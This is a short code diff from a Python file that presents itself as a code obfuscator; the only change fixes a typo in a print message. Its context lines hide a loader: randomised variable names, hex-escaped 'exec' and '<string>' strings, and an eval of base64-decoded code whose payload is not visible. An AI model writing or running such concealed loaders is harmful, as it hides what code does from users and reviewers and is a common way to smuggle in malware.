@@ -553,4 +553,4 @@ uMasBevzdThp=JmDzbPljXbCi+DWhoJHNCQZvK+DdLkPtNmoFQo+vTUGVDdBhOuN+UkvHxPURbJlh+qY
 xfmcbJMDQrRPrGC='\x3c\x73\x74\x72\x69\x6e\x67\x3e'
 LnOZxJmCBWXjrbS='\x65\x78\x65\x63'
 eval(compile(base64.b64decode(uMasBevzdThp),xfmcbJMDQrRPrGC,LnOZxJmCBWXjrbS))
-print("Python code obfuscater loaded. Use COhelp() for help")
+print("Python code obfuscator loaded. Use COhelp() for help")
